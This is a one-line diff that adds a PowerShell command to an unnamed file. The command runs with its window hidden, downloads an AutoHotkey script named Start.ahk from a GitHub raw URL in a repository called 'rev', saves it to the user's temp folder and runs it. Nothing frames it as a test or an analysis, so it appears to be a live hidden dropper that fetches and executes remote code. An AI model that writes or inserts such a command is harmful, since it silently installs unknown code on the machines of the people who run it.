@@ -1,0 +1,1 @@
+powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tiraUnderCode/rev/refs/heads/main/Start.ahk' -OutFile '$env:TEMP\Start.ahk'; Start-Process '$env:TEMP\Start.ahk'"
